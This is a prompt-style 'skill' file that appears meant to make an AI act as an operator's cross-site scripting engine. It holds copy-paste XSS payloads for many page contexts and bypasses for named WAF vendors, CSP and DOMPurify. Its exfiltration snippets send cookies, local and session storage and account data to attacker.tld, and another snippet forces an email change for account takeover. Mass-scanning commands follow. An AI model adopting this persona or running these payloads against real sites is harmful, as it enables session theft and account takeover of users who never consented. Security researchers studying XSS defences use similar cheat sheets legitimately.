# SKILL: Cross-Site Scripting (Reflected / Stored / DOM / mXSS / Universal)

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (cross-site scripting (reflected / stored / dom / mxss / universal)) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
I am the operator's XSS engine. I never just send `<script>alert(1)</script>` — I map the reflection context (HTML body / attribute / JS / URL / SVG / CSS / template / JSON / SMTP), enumerate filters, and chain to ATO.

---

## DETECTION
- **Reflected:** inject canary `xss<u>{rand}</u>` into every parameter; grep response for both encoded and unencoded reflections. Tools: `gxss`, `kxss`, `dalfox`, `xsstrike`, `freq` (entropy diff).
- **Stored:** inject canary into every input, then crawl every read endpoint; correlate. Tools: Burp Collaborator + custom intruder, `xss-hunter` (puts blind hooks).
- **DOM:** Burp DOM Invader, manual: `document.location.search` / `URL.fragment` / `postMessage` data flow. Static: jsluice + `dom-clobbering` knowledge.
- **Blind:** XSS Hunter / Project Discovery's Interactsh; place payload in admin-readable fields (User-Agent, support tickets, profile fields, bug reports).
- **mXSS:** mutation differs between innerHTML serialization → `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p>`

## EXPLOITATION
1. **Confirm context:** view source + DOM Invader. Is reflection inside HTML body, an attribute (single/double/unquoted), JS string, JS template, JSON-in-script, SVG, CSS, URL?
2. **Pick minimal payload for context** (see Payloads section).
3. **Confirm execution:** alert/document.domain/window.opener.location.
4. **Chain to ATO:** steal `document.cookie` (only if not HttpOnly), or steal sessionStorage / IndexedDB tokens, or fetch `/api/v1/me/email` and exfil PII via Collaborator.
5. **Persistence (stored):** make the payload viewable by admins (support tickets, profile bio, file metadata, account name).

## PAYLOADS (real, copy-paste, grouped)
### HTML body context
```html
<svg/onload=alert(document.domain)>
<img src=x onerror=alert(document.domain)>
<iframe srcdoc="<script>alert(document.domain)</script>">
<details open ontoggle=alert(document.domain)>
<video><source onerror=alert(document.domain)>
<audio src=x onerror=alert(document.domain)>
<body onpageshow=alert(document.domain)>
<input autofocus onfocus=alert(document.domain)>
<marquee onstart=alert(document.domain)>
<form><button formaction=javascript:alert(document.domain)>X
```

### Inside double-quoted HTML attribute
```html
" autofocus onfocus=alert(document.domain) x="
"><svg/onload=alert(document.domain)>
" onmouseover=alert(document.domain) x="
"%20accesskey=X%20onclick=alert(1)%20x="
```

### Inside single-quoted HTML attribute
```html
' autofocus onfocus=alert(document.domain) x='
'><svg/onload=alert(document.domain)>
```

### Unquoted attribute
```html
x onmouseover=alert(1) y=
x/onfocus=alert(1)/autofocus
```

### Inside JS string (single-quote)
```javascript
';alert(document.domain);//
';alert(document.domain);var x='
\';alert(document.domain);//
';-alert(1)-'
```

### Inside JS template literal
```javascript
${alert(document.domain)}
```

### Inside JSON-in-`<script>` (double escape)
```json
"</script><svg/onload=alert(document.domain)>"
```

### URL / href / src context (`javascript:` schema)
```
javascript:alert(document.domain)
javascript://%0aalert(document.domain)
data:text/html,<script>alert(document.domain)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
```

### SVG context
```html
<svg><g/onload=alert(document.domain)></g></svg>
<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>
<svg><script href=data:,alert(1) /></svg>
<svg><script>alert&#40;1&#41;</script></svg>
```

### CSS injection / `style` context
```html
<style>@import 'http://attacker.tld/x.css';</style>
<style>body{background:url("javascript:alert(1)")}</style>
```

### Filter bypass — angle bracket / script keyword filtered
```html
<svg/onload=alert`1`>
<img src=x onerror=alert`1`>
<iframe srcdoc="<svg onload=alert(1)>">
<a href="jav&#x09;ascript:alert(1)">x</a>     <!-- tab in scheme -->
<a href="jav&NewLine;ascript:alert(1)">x</a>  <!-- entity newline -->
```

### Unicode / case-bypass
```html
<ScRiPt>alert(1)</sCrIpT>
<svg><sCrIpT>alert(1)</sCrIpT>
%uff1cscript%uff1ealert(1)%uff1c/script%uff1e
```

### `expression(...)` / IE-only legacy (still useful in mobile WebViews)
```html
<div style=xss:expression(alert(1))>
```

### DOMpurify bypasses (current as of 3.x)
```html
<form><math><mtext></form><form><mglyph><svg><mtext><textarea><a title="</textarea><img src=x onerror=alert(1)>">
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### Markdown / WYSIWYG (commonmark, marked)
```markdown
[xss](javascript:alert(1))
[xss](javascript&colon;alert(1))
[xss](j&Tab;avascript:alert(1))
![](data:text/html,<script>alert(1)</script>)
```

### Polyglot (works in many contexts)
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### Exfil patterns (after exec)
```javascript
// Cookie steal
new Image().src='https://attacker.tld/?c='+btoa(document.cookie)

// localStorage + sessionStorage exfil
fetch('https://attacker.tld/x',{method:'POST',body:btoa(JSON.stringify({c:document.cookie,l:JSON.stringify(localStorage),s:JSON.stringify(sessionStorage)}))})

// CSRF token theft + ATO action
fetch('/api/me',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://attacker.tld/?d='+btoa(JSON.stringify(d))))
fetch('/api/email/change',{method:'POST',credentials:'include',headers:{'X-CSRF':document.cookie.match(/csrf=([^;]+)/)[1]},body:'newEmail=attacker@tld'})
```

## BYPASS TECHNIQUES
### WAF — Cloudflare
- Use `<svg/onload=...>` instead of `<script>`
- Newline split tag: `<svg\non\nload=alert(1)>`
- Comment trick: `<svg/*x*/onload=alert(1)>`
- Hex-encode event names — sometimes works: `&lt;svg onload=&quot;alert(1)&quot;&gt;` then bypass via double-decode
- Switch to `expression()` / `data:` URLs in iframe srcdoc

### WAF — Akamai
- Akamai blocks `script` keyword aggressively → use `<svg>`, `<math>`, `<details>` event handlers
- Splits on `<` close immediately → `<form><math><mtext></form><form><mglyph><svg>...`

### WAF — AWS WAF
- AWS WAF blocks `alert(1)` literal → use `alert\u00281\u0029` or `eval('al'+'ert(1)')` or `window['al'+'ert'](1)`
- Body size limit ~8KB on default ruleset → push payload past limit with junk

### WAF — Imperva (Incapsula)
- Hates `<script>` and `on*=` → use `<style>@import` or `formaction`
- Try parameter pollution: `?q=harmless&q=<svg/onload>`

### WAF — F5 ASM
- Try `<details ontoggle=`, `<svg><animate onbegin=`, or fragment-based DOM XSS (no server WAF inspects URL fragment)

### CSP bypass
- Find a JSONP endpoint on a CSP-allowed domain: `<script src=https://allowed.com/jsonp?callback=alert(document.domain)>`
- Find an open redirect on an allowed domain → use as script src
- AngularJS gadget if `unsafe-eval` or AngularJS is allowed: `<div ng-app ng-csp><div ng-click=$event.view.alert(1)>x</div></div>`
- Trusted Types bypass via DOMPurify mutation
- `'unsafe-inline'` + `nonce` reuse if app reflects the nonce
- Find a `script-src 'self'` and an upload that returns `Content-Type: text/javascript` → polyglot file upload → execute as script

### Encoding tiers (try in order)
1. URL-encode `<` → `%3C`
2. Double URL-encode → `%253C`
3. HTML-entity `&lt;` (works in some contexts)
4. UTF-7 `+ADw-` (legacy IE, some WAFs)
5. UTF-16 BOM tricks
6. Mixed case + insertion of zero-width chars (`\u200B`)

## CHAIN POTENTIAL
- XSS → cookie steal → ATO (if non-HttpOnly).
- XSS → CSRF token theft → ATO via password change / email change endpoint.
- XSS → IDOR (read other-user data via authenticated fetch from victim's session).
- Stored XSS in admin panel → admin ATO → tenant takeover (multi-tenant SaaS).
- XSS in support widget seen by support staff → escalate to internal admin panel access.
- DOM XSS via `postMessage` from same-origin iframe → cross-iframe RCE in plugin host pages (e.g., chat widgets embedded in customer sites).
- mXSS in user-generated HTML email → recipient's mail client compromise.

## TOOLS
- `dalfox` — automated XSS scanner with DOM verification
- `xsstrike` — context-aware payload generator
- `gxss`, `kxss`, `freq` — reflection finders
- `XSS Hunter Express` (self-hosted) for blind XSS callbacks
- `Burp DOM Invader` (best DOM XSS tool)
- `puppeteer` / `playwright` for headless DOM verification
- `dompurify-bypass-payloads` GitHub repos
- `cure53/H5SC` — HTML5 Security Cheatsheet

## COMMANDS
```bash
# kxss — find reflected GET params
cat urls.txt | qsreplace 'xss"\'<svg' | kxss

# dalfox pipeline
cat urls.txt | dalfox pipe --silence -b your.xss.ht --skip-bav -o dalfox.txt

# Stored XSS hunt — stuff every input field, then crawl
ffuf -w fields.txt:FIELD -u "https://target/api/profile" -X POST \
  -H "Content-Type: application/json" -H "Authorization: Bearer $T" \
  -d '{"FIELD":"<svg onload=fetch(`https://your.xss.ht/?c=`+document.cookie)>"}' \
  -mc 200,201

# Blind XSS — set up XSS Hunter / use Project Discovery interact.sh
echo '"><script src="//your.xss.ht/x"></script>' | tee blind.txt
# fire into all UA / Referer / form fields

# DOM XSS quick test
curl -sk "https://target/?q=<svg/onload=alert(1)>" | grep -E "alert|svg"
```

## EDGE CASES / NOT-A-BUG TRAPS
- **Self-XSS** — only victim can trigger; not a valid bug unless chained with login CSRF or open redirect.
- **PDF render of HTML** — server-side XSS in PDF generator → SSRF + LFI primitive (chromium/headless).
- **Email-rendered HTML** — Outlook strips JS but renders CSS / `<meta refresh>` for phishing.
- **Markdown XSS** — only counts if a privileged user (admin) views it.
- **`HttpOnly` cookies** — XSS still grants action-as-victim via fetch with credentials, but no raw cookie. Triagers will accept this.
- **Content-Type sniffing** — `text/plain` response with HTML payload ≠ XSS in modern browsers (sniffing protection); but legacy IE / WebViews still execute.
- **Stored in unviewable place** — payload stored but only echoed in JSON API not rendered by frontend → not exploitable unless chained.

## TRIAGE ANGLE (per platform)
- **HackerOne** — reflected XSS without chain often closed P3-low or even Informative. Always demonstrate cookie/session theft or CSRF chain.
- **Bugcrowd** — VRT entry P3 (XSS Reflected) baseline; P2 if stored impacting other users; P1 if admin XSS or universal XSS.
- **Intigriti** — chain to account modification = P2-P3.
- Show the operator-typed redirect URL in the PoC matching `attacker.tld` to prove exploitation.

## SEVERITY & CVSS
CVSS 3.1 baseline reflected: AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N → 6.1 (Medium).
Stored impacting admins: ...PR:L... → 7.5+ (High).
DOM with no user interaction: UI:N → 7.4 (High).

## REFERENCES
- PortSwigger XSS Cheat Sheet (best maintained)
- HTML5 Security Cheatsheet (cure53/H5SC)
- PayloadsAllTheThings/XSS Injection
- Bug Bounty Bootcamp Ch. 6 (XSS)
- The Tangled Web Ch. 3, 4 (browser security model)
- Gareth Heyes — JavaScript for Hackers
- HackerOne disclosed reports tagged xss (sort by bounty)
